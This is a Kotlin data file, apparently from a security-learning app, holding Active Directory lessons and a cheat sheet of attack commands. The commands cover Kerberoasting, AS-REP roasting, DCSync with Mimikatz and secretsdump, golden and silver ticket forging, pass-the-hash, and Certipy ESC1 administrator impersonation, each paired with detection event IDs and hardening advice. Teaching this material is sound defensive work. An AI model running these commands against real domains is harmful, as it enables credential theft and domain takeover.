package com.example.data.learning

data class AdTopicModule(
    val id: String,
    val title: String,
    val phaseNumber: Int,
    val tag: String,
    val summary: String,
    val deepDiveDetails: String,
    val keyTools: List<String>,
    val handsOnCommand: String,
    val defensiveRemediation: String
)

data class AdAttackToolCommand(
    val title: String,
    val category: String,
    val toolName: String,
    val command: String,
    val description: String,
    val detectionEventId: String
)

object ActiveDirectoryData {

    val modules: List<AdTopicModule> = listOf(
        AdTopicModule(
            id = "ad_arch_foundations",
            title = "Active Directory Architecture & Database Foundations",
            phaseNumber = 1,
            tag = "Core Architecture",
            summary = "Understanding the Active Directory hierarchy, domain controllers, NTDS.dit database structure, Global Catalog, and AdminSDHolder protection.",
            deepDiveDetails = """
                • Directory Hierarchy: An Active Directory Forest is the top-level security boundary containing one or more Domain Trees, which contain Domains and Organizational Units (OUs).
                • The NTDS.dit Database: The Extensible Storage Engine (ESE) database located at %SystemRoot%\NTDS\ntds.dit holds all directory objects, user accounts, groups, and password hashes (in the 'datatable').
                • Schema & Configuration Partitions: Replicated forest-wide across all Domain Controllers (DCs); defines classes and attributes available to objects.
                • AdminSDHolder & SDProp: A specialized security template object in the System container. Every 60 minutes, the Security Descriptor Propagator (SDProp) runs to overwrite ACLs on protected administrative groups (Domain Admins, Enterprise Admins) with the AdminSDHolder ACL, preventing permission inheritance tampering.
            """.trimIndent(),
            keyTools = listOf("ActiveDirectory PowerShell Module", "ADSI Edit", "LDP.exe", "Ntdsutil.exe"),
            handsOnCommand = """
# Inspect Active Directory Forest and Domain Functional Levels via PowerShell
Get-ADForest | Select-Object Name, ForestMode, SchemaMaster, DomainNamingMaster
Get-ADDomain | Select-Object Name, DomainMode, InfrastructureMaster, PDCEmulator, RIDMaster

# Check AdminSDHolder object ACLs
Get-Acl "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local" | Format-List
            """.trimIndent(),
            defensiveRemediation = "Protect Domain Controllers as Tier 0 assets. Never run non-DC workloads or browse the web from DCs. Monitor modifications to the AdminSDHolder container (Event ID 5136)."
        ),
        AdTopicModule(
            id = "ad_kerberos_auth",
            title = "Kerberos Authentication Protocol & Ticket Mechanics",
            phaseNumber = 2,
            tag = "Authentication",
            summary = "Deep dive into Kerberos 3-way handshake: AS-REQ/AS-REP, TGS-REQ/TGS-REP, AP-REQ, Privilege Attribute Certificates (PAC), and Kerberos Armoring.",
            deepDiveDetails = """
                • Step 1: Authentication Service Exchange (AS-REQ / AS-REP):
                  - Client sends an AS-REQ containing a timestamp encrypted with the user's password hash (pre-authentication).
                  - The KDC (Key Distribution Center on the DC) decrypts the timestamp. If valid, it responds with an AS-REP containing:
                    1) The Ticket Granting Ticket (TGT), encrypted with the KDC's master secret (KRBTGT account password hash).
                    2) A Logon Session Key, encrypted with the user's password hash.
                • Step 2: Ticket Granting Service Exchange (TGS-REQ / TGS-REP):
                  - To access a service (e.g. MSSQL or SMB), the client sends a TGS-REQ containing the TGT and the target Service Principal Name (SPN).
                  - The KDC validates the TGT using the KRBTGT key, extracts the user's PAC (Privilege Attribute Certificate listing SIDs/groups), and responds with a TGS Ticket encrypted with the service account's password hash.
                • Step 3: Application Exchange (AP-REQ / AP-REP):
                  - Client presents the TGS ticket to the target service. The service decrypts the ticket using its own password hash and validates the PAC without contacting the DC.
            """.trimIndent(),
            keyTools = listOf("klist", "Rubeus", "Mimikatz", "Wireshark (Kerberos dissector)", "Kerbrute"),
            handsOnCommand = """
# View currently cached Kerberos tickets in current logon session
klist

# Request a Kerberos TGT using Rubeus and inspect the PAC
Rubeus.exe asktgt /user:jdoe /password:Welcome2024! /domain:corp.local /dc:dc01.corp.local

# Purge cached tickets
klist purge
            """.trimIndent(),
            defensiveRemediation = "Enforce AES-128 and AES-256 encryption types for Kerberos and disable legacy RC4 (DES/RC4). Enable Kerberos Armoring (Flexible Authentication Secure Tunneling - FAST)."
        ),
        AdTopicModule(
            id = "ad_recon_bloodhound",
            title = "Active Directory Enumeration & BloodHound Graph Analysis",
            phaseNumber = 3,
            tag = "Reconnaissance",
            summary = "Mapping attack paths, Access Control Lists (ACLs), user sessions, and domain trusts using LDAP queries, PowerView, and BloodHound.",
            deepDiveDetails = """
                • Graph Theory in AD: Active Directory is an interconnected graph of objects (Users, Computers, Groups, OUs, Containers) connected by access control relationships (MemberOf, GenericAll, WriteDacl, Owns, ForceChangePassword, HasSession).
                • BloodHound Mechanics: BloodHound uses data collectors (SharpHound.exe or bloodhound-python) that query Active Directory via LDAP, SMB, and RPC (NetSessionEnum) to extract group memberships, local admin rights, and logged-in user sessions.
                • High-Risk Attack Edges:
                  - 'GenericAll' / 'GenericWrite': Allows changing passwords or modifying object attributes directly.
                  - 'WriteDacl': Allows granting oneself Full Control over a target object.
                  - 'AddMember': Allows injecting accounts into high-privilege groups.
            """.trimIndent(),
            keyTools = listOf("BloodHound CE", "SharpHound.exe", "PowerView.ps1", "ADRecon", "ldapsearch"),
            handsOnCommand = """
# Run SharpHound collector from a domain-joined machine
SharpHound.exe -c All --zipfilename ad_collection.zip

# PowerView: Find all computers where current user has local admin rights
Find-LocalAdminAccess -Verbose

# Query domain users with Service Principal Names (SPNs)
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
            """.trimIndent(),
            defensiveRemediation = "Perform recurring BloodHound audits to identify and sever indirect attack paths to Tier 0 groups. Restrict RPC and SAMR enumeration using Windows 10/11 RestrictRemoteSAM policies."
        ),
        AdTopicModule(
            id = "ad_classic_redteam",
            title = "Classic Red Teaming: Kerberoasting, AS-REP & DCSync",
            phaseNumber = 4,
            tag = "Red Teaming",
            summary = "Mastering the most effective Active Directory credential theft techniques: Kerberoasting, AS-REP Roasting, Pass-the-Hash, and DCSync replication.",
            deepDiveDetails = """
                • Kerberoasting: Any valid domain user can request a Kerberos service ticket (TGS) for any service account with a ServicePrincipalName (SPN). Because the ticket is encrypted with the service account's password hash, the attacker extracts the ticket from memory and cracks it offline with dictionary wordlists without triggering account lockouts on the DC.
                • AS-REP Roasting: Accounts configured with 'Do not require Kerberos preauthentication' (DONT_REQ_PREAUTH) can have an AS-REP ticket requested without providing a password. The returned encrypted data can be cracked offline.
                • DCSync Attack: Leverages the Directory Replication Service Remote Protocol (MS-DRSR). If an account possesses the 'Replicating Directory Changes' and 'Replicating Directory Changes All' rights (default for Domain Admins and Domain Controllers), it requests directory replication from the DC and dumps all domain password hashes (including KRBTGT) without running any code on the DC itself.
            """.trimIndent(),
            keyTools = listOf("Impacket (GetUserSPNs, secretsdump)", "Rubeus", "Mimikatz", "Hashcat mode 13100 & 18200"),
            handsOnCommand = """
# 1. Kerberoasting with Impacket (request and save hashes)
GetUserSPNs.py corp.local/jdoe:Password123 -dc-ip 10.0.0.1 -request -outputfile kerberoast.hashes

# 2. Crack TGS hash offline with Hashcat (mode 13100)
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# 3. AS-REP Roasting with Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes

# 4. DCSync execution with Mimikatz
privilege::debug
lsadump::dcsync /domain:corp.local /user:krbtgt
            """.trimIndent(),
            defensiveRemediation = "Migrate service accounts to Group Managed Service Accounts (gMSA) with 120-character auto-rotating passwords. Audit accounts for 'DONT_REQ_PREAUTH'. Monitor Event ID 4662 for DCSync replication rights requests."
        ),
        AdTopicModule(
            id = "ad_ticket_forging",
            title = "Advanced Ticket Forging: Golden, Silver & Diamond Tickets",
            phaseNumber = 5,
            tag = "Persistence",
            summary = "Forging custom Kerberos tickets to achieve complete domain dominance, bypass logging, and establish covert administrative persistence.",
            deepDiveDetails = """
                • Golden Ticket (Forged TGT):
                  - If an attacker obtains the NTLM hash or AES key of the 'krbtgt' account, they can forge a Ticket Granting Ticket (TGT) for any user (even non-existent users) with arbitrary group memberships (e.g. Domain Admins, Enterprise Admins).
                  - Valid for up to 10 years by default. Persists even if regular user passwords change.
                • Silver Ticket (Forged TGS):
                  - Forged using the password hash of a specific service account (e.g. cifs/fileserver or http/intranet).
                  - The client communicates directly with the target service; the Domain Controller is completely bypassed, generating zero Event ID 4768 / 4769 logs on the DC!
                • Diamond Ticket:
                  - Requests a genuine TGT from the DC, then decrypts it using the KRBTGT key, modifies the PAC (adding Domain Admin SIDs), recalculates PAC signatures, and re-encrypts it. This bypasses detection rules that search for non-matching ticket serial numbers or missing AS-REQ events.
            """.trimIndent(),
            keyTools = listOf("Mimikatz (kerberos::golden)", "Rubeus (golden / diamond)", "Kekeo"),
            handsOnCommand = """
# Golden Ticket generation with Mimikatz
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:b2a5...hash... /id:500 /ptt

# Silver Ticket generation for CIFS service
kerberos::golden /domain:corp.local /sid:S-1-5-21-123456789-123456789-123456789 /target:dc01.corp.local /service:cifs /rc4:service_ntlm_hash /user:Administrator /ptt
            """.trimIndent(),
            defensiveRemediation = "Reset the 'krbtgt' account password twice consecutively (with a 24-hour interval between resets to prevent Kerberos ticket invalidation outages for active sessions)."
        ),
        AdTopicModule(
            id = "ad_cs_exploitation",
            title = "Active Directory Certificate Services (AD CS) Exploitation",
            phaseNumber = 6,
            tag = "PKI & Certificate Abuse",
            summary = "Exploiting misconfigured enterprise certificate templates (ESC1 through ESC8) to impersonate Domain Admins via cryptographic client certificates.",
            deepDiveDetails = """
                • AD CS Basics: Active Directory Certificate Services (AD CS) provides Public Key Infrastructure (PKI) integration with Active Directory, issuing X.509 certificates for authentication, code signing, and encryption.
                • ESC1 (Enrollee Supplies Subject):
                  - A certificate template permits Client Authentication (EKU), low-privileged users have enrollment rights, and 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT' is set.
                  - Attackers request a certificate while supplying the Subject Alternative Name (SAN) of 'Administrator', receiving a valid certificate that can authenticate with Kerberos PKINIT to receive a Domain Admin TGT!
                • ESC8 (NTLM Relay to AD CS Web Enrollment HTTP endpoints):
                  - AD CS HTTP enrollment endpoints (/certsrv/) lack EPA (Extended Protection for Authentication) and SMB signing enforcement.
                  - Attackers coerce authentication from a Domain Controller (via PetitPotam or PrinterBug) and relay the DC's machine account NetNTLM authentication to the /certsrv/ endpoint to obtain a certificate for the DC, followed by a DCSync attack.
            """.trimIndent(),
            keyTools = listOf("Certipy", "PKINITtools", "PetitPotam", "ntlmrelayx.py", "ForgeCert"),
            handsOnCommand = """
# 1. Enumerate vulnerable certificate templates using Certipy
certipy find -vulnerable -u jdoe@corp.local -p Welcome2024! -dc-ip 10.0.0.1

# 2. Exploit ESC1: Request certificate impersonating Domain Administrator
certipy req -u jdoe@corp.local -p Welcome2024! -ca CORP-CA -template VulnerableTemplate -upn administrator@corp.local

# 3. Authenticate with PKINIT using generated certificate to receive TGT and NTLM hash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
            """.trimIndent(),
            defensiveRemediation = "Audit certificate templates for 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT'. Disable NTLM on AD CS web enrollment interfaces or enforce HTTPS with Extended Protection for Authentication (EPA)."
        ),
        AdTopicModule(
            id = "ad_tiered_hardening",
            title = "Active Directory Defense-in-Depth & Tiered Administration",
            phaseNumber = 7,
            tag = "Hardening & Architecture",
            summary = "Implementing the Microsoft Enterprise Access Model, Privileged Access Workstations (PAWs), LAPS, Protected Users group, and Credential Guard.",
            deepDiveDetails = """
                • Microsoft Enterprise Access Model (Tiered Model):
                  - Tier 0 (Control Plane): Domain Controllers, AD FS, PKI/CAs, Entra Connect, Azure Tier 0 admins.
                  - Tier 1 (Management Plane): Enterprise servers, databases, cloud resources, storage arrays.
                  - Tier 2 (User Access): Workstations, client endpoints, standard user sessions.
                  - Golden Rule: Credentials from a higher tier must NEVER be entered or cached on a lower-tier asset!
                • Local Administrator Password Solution (Windows LAPS):
                  - Eliminates identical local administrator passwords across workstations, generating a unique, cryptographically random password for each machine stored in an encrypted AD attribute.
                • Protected Users Security Group:
                  - Accounts in this group cannot use NTLM, Digest authentication, or CredSSP. Kerberos does not use RC4, and TGT lifetime is capped at 4 hours without renewal.
                • Windows Defender Credential Guard:
                  - Uses Virtualization-based Security (VBS) to isolate LSASS secrets in an isolated Hyper-V micro-container, preventing Mimikatz and memory scrapers from reading NTLM hashes or Kerberos tickets even if the attacker has SYSTEM access.
            """.trimIndent(),
            keyTools = listOf("Windows LAPS", "Microsoft Privileged Access Workstations (PAW)", "Group Policy Objects", "Credential Guard"),
            handsOnCommand = """
# Add high-privilege administrative accounts to the Protected Users group
Add-ADGroupMember -Identity "Protected Users" -Members "admin_jdoe", "domain_admin_svc"

# Verify LAPS deployment status on computer accounts
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwdExpirationTime | Select-Object Name, ms-Mcs-AdmPwdExpirationTime

# Enable Credential Guard via Group Policy (Computer Configuration -> System -> Device Guard)
            """.trimIndent(),
            defensiveRemediation = "Enforce Tier 0 separation with dedicated physical or hardware-isolated PAWs. Enable Windows Defender Credential Guard on all endpoints. Mandate phishing-resistant FIDO2 hardware security keys for all Tier 0 administrators."
        )
    )

    val cheatSheetCommands: List<AdAttackToolCommand> = listOf(
        AdAttackToolCommand(
            title = "Impacket GetUserSPNs (Kerberoasting)",
            category = "Credential Access",
            toolName = "Impacket",
            command = "GetUserSPNs.py corp.local/username:password -dc-ip 10.0.0.1 -request -outputfile tgs_hashes.txt",
            description = "Queries AD for accounts with SPNs and requests TGS tickets formatted for Hashcat offline cracking.",
            detectionEventId = "Event ID 4769 (A Kerberos service ticket was requested with Ticket Options 0x40810000 and Encryption Type 0x17)"
        ),
        AdAttackToolCommand(
            title = "Impacket secretsdump (DCSync)",
            category = "Credential Dumping",
            toolName = "Impacket",
            command = "secretsdump.py corp.local/adminuser:password@10.0.0.1 -just-dc-user krbtgt",
            description = "Leverages DRSUAPI directory replication to dump the NTDS.dit password hash for the krbtgt account without touching the DC filesystem.",
            detectionEventId = "Event ID 4662 (An operation was performed on an object - AccessMask 0x100 and DS-Replication-Get-Changes-All GUID)"
        ),
        AdAttackToolCommand(
            title = "Rubeus AS-REP Roasting",
            category = "Credential Access",
            toolName = "Rubeus",
            command = "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt",
            description = "Requests AS-REP responses for domain accounts with DONT_REQ_PREAUTH enabled and outputs crackable hashes.",
            detectionEventId = "Event ID 4768 (A Kerberos authentication ticket was requested without Pre-Authentication Type)"
        ),
        AdAttackToolCommand(
            title = "Certipy Vulnerable Template Scan",
            category = "AD CS PKI Abuse",
            toolName = "Certipy",
            command = "certipy find -vulnerable -u user@corp.local -p password -dc-ip 10.0.0.1 -stdout",
            description = "Scans all Active Directory Certificate Services templates and identifies ESC1 through ESC8 misconfigurations.",
            detectionEventId = "Event ID 4898 (Certificate Services template loaded or modified)"
        ),
        AdAttackToolCommand(
            title = "SharpHound Full AD Collection",
            category = "Enumeration",
            toolName = "SharpHound",
            command = "SharpHound.exe -c All --zipfilename bloodhound_data.zip",
            description = "Gathers all users, groups, computer sessions, domain trusts, and ACL permissions for BloodHound graph analysis.",
            detectionEventId = "Spike in LDAP queries (Event ID 1644 in Directory Service log)"
        ),
        AdAttackToolCommand(
            title = "Mimikatz Pass-the-Hash (PtH)",
            category = "Lateral Movement",
            toolName = "Mimikatz",
            command = "sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:b2a5e... /run:powershell.exe",
            description = "Spawns a new process with the NTLM hash injected into the local LSA authentication context, bypassing plaintext password requirements.",
            detectionEventId = "Event ID 4624 (Logon Type 9 - NewCredentials)"
        )
    )

    val resourceLinks: List<com.example.data.model.RoadmapResourceLink> = listOf(
        com.example.data.model.RoadmapResourceLink(
            title = "SpecterOps BloodHound Community Edition",
            description = "Six Degrees of Domain Admin: Graph theory tool for mapping Active Directory attack paths and ACL relationships.",
            url = "https://github.com/SpecterOps/BloodHound",
            tag = "Attack Graph Tool",
            domainOrProvider = "github.com"
        ),
        com.example.data.model.RoadmapResourceLink(
            title = "Mimikatz Official Repository (gentilkiwi)",
            description = "The premier post-exploitation tool for Kerberos tickets (Golden/Silver/Diamond), DCSync, and LSASS memory extraction.",
            url = "https://github.com/gentilkiwi/mimikatz",
            tag = "Red Team Tool",
            domainOrProvider = "github.com"
        ),
        com.example.data.model.RoadmapResourceLink(
            title = "Fortra Impacket Network Protocols Suite",
            description = "Collection of Python classes for working with network protocols (secretsdump.py, wmiexec.py, psexec.py, GetUserSPNs.py).",
            url = "https://github.com/fortra/impacket",
            tag = "Network Protocol Suite",
            domainOrProvider = "github.com"
        ),
        com.example.data.model.RoadmapResourceLink(
            title = "The Hacker Recipes: Active Directory & Kerberos Attacks",
            description = "Field manual recipes covering Kerberoasting, AS-REP Roasting, Unconstrained Delegation, and Pass-the-Ticket step-by-step.",
            url = "https://www.thehacker.recipes/ad/",
            tag = "Playbook Guide",
            domainOrProvider = "thehacker.recipes"
        ),
        com.example.data.model.RoadmapResourceLink(
            title = "Certified Pre-Owned: AD Certificate Services (AD CS) Exploitation",
            description = "The definitive whitepaper and technical specification by Will Schroeder and Lee Christensen detailing ESC1 to ESC8 PKI flaws.",
            url = "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",
            tag = "Research Paper",
            domainOrProvider = "specterops.io"
        ),
        com.example.data.model.RoadmapResourceLink(
            title = "Microsoft Learn: Securing Domain Controllers & Active Directory",
            description = "Official Microsoft guidelines on Tier 0 architecture, Privileged Access Workstations (PAWs), and AdminSDHolder hardening.",
            url = "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/securing-domain-controllers-against-attack",
            tag = "Tier 0 Defense",
            domainOrProvider = "learn.microsoft.com"
        )
    )
}
